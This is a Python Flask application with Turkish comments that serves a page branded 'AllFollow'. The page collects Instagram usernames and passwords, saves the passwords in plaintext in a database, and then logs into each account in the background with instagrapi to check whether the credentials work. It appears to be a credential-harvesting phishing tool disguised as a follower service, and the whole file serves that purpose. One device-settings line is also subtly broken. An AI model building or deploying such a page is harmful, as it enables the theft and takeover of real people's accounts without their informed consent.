import os
import threading
import time
import requests
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

def attempt_login(u, p):
    with app.app_context():
        cl = Client()
        # KRİTİK: Instagram'a 5 saniye içinde ulaşamazsa pes et diyoruz.
        cl.request_timeout = 5 
        
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            # Rastgele cihaz ayarları
            cl.set_device_settings(cl.delay_range == [1, 2])
            
            # Login denemesi
            if cl.login(u, p):
                acc.status = "AKTİF ✅"
            else:
                acc.status = "GİRİŞ BAŞARISIZ ❌"
        except ChallengeRequired:
            acc.status = "ONAY KODU LAZIM ⚠️"
        except BadPassword:
            acc.status = "ŞİFRE YANLIŞ ❌"
        except Exception as e:
            # Instagram Render'ı engellediğinde buraya düşer (Timeout dahil)
            acc.status = "IP ENGELİ / SUNUCU REDDİ 🚫"
        
        db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="İşlem Başlatıldı...")
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "İşlem Başlatıldı..."
    db.session.commit()
    
    # Thread başlat ve hemen cevap dön (Render Timeout'u önlemek için)
    threading.Thread(target=attempt_login, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "Bulunamadı")

HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white flex items-center justify-center min-h-screen">
    <div id="p1" class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-80 text-center">
        <h1 class="text-2xl font-black text-purple-500 mb-6 italic uppercase">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-3 outline-none focus:border-purple-500">
        <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-6 outline-none focus:border-purple-500">
        <button onclick="go()" class="w-full bg-purple-600 font-bold py-3 rounded-xl transition active:scale-95">GİRİŞ YAP</button>
    </div>

    <div id="p2" class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-80 text-center hidden">
        <div id="ldr" class="animate-spin h-8 w-8 border-4 border-purple-500 border-t-transparent rounded-full mx-auto mb-4"></div>
        <p id="msg" class="font-bold">Bağlantı Kuruluyor...</p>
        <button onclick="location.reload()" id="back" class="mt-6 text-xs text-zinc-500 underline hidden">TEKRAR DENE</button>
    </div>

    <script>
        async function go() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('p1').classList.add('hidden');
            document.getElementById('p2').classList.remove('hidden');

            fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            const check = setInterval(async () => {
                const r = await fetch('/api/status/' + u);
                const d = await r.json();
                const m = document.getElementById('msg');

                if(d.status !== "İşlem Başlatıldı...") {
                    clearInterval(check);
                    m.innerText = d.status;
                    document.getElementById('ldr').classList.add('hidden');
                    document.getElementById('back').classList.remove('hidden');
                    
                    if(d.status.includes('✅')) m.className = "text-green-500 font-bold";
                    if(d.status.includes('🚫') || d.status.includes('❌')) m.className = "text-red-500 font-bold";
                }
            }, 2000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
